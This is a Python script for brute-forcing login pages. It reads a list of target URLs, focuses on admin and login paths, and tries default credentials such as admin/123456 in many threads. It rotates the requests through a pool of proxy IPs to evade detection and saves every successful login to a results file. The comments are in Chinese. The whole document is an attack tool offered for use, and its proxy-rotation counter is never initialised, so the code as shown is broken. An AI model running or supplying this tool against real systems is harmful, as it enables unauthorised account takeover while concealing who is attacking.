import requests
import threading
import re

with open('url_list.txt') as f:
    url_list = f.read().splitlines()
url_list = [url for url in url_list if not url.startswith('#')]

username_list = ['admin', 'root', 'guest']
password_list = ['123456', 'password', '1234567']

proxy_list = ['ip1:port', 'ip2:port']  # 代理IP池


def scan(url, username, password, proxy):
    proxy = {'http': proxy, 'https': proxy}  # 设置代理
    data = {'username': username, 'password': password}

    try:
        r = requests.post(url, proxies=proxy, data=data, timeout=2)
        if '登录成功' in r.text or '管理中心' in r.text:
            with open('result.txt', 'a+') as f:
                f.write(f'[+] {url} login succeeded! Username: {username} Password: {password}\n')
    except:
        pass  # 超时等异常忽略不计


for url in url_list:
    if '/admin/' in url or '/login/' in url:  # 优先扫描敏感目录
        for username in username_list:
            for password in password_list:
                proxy = proxy_list[i % len(proxy_list)]  # 循环使用代理IP
                i += 1
                t = threading.Thread(target=scan, args=(url, username, password, proxy))
                t.start()